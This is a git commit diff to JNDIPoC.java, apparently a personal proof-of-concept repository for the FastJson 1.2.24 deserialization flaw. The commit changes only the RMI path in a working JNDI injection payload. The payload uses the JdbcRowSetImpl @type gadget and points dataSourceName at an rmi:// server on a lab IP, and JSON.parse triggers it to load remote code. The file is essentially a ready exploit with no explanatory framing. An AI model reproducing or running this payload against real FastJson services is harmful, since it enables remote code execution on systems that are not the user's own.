d5a3c21d6c6144f83cc49f0b7cf17990ee264aa1
N0zoM1z0 <1705004398@qq.com>
2025-02-10 21:35:11 +0800

    add sth

--- FastJson/FastJson_1-2-24/src/main/java/JNDIPoC.java
+++ FastJson/FastJson_1-2-24/src/main/java/JNDIPoC.java
@@ -4,7 +4,7 @@ import com.sun.rowset.JdbcRowSetImpl;
 public class JNDIPoC {
     public static void main(String[] args) throws Exception {
         System.out.println("[+] Test FastJson 1.2.24 JNDI PoC");
-        String payload = "{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"rmi://192.168.37.134:1099/zoznqv\", \"autoCommit\":true}";
+        String payload = "{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"rmi://192.168.37.134:1099/qg2fuy\", \"autoCommit\":true}";
         JSON.parse(payload);
 
     }
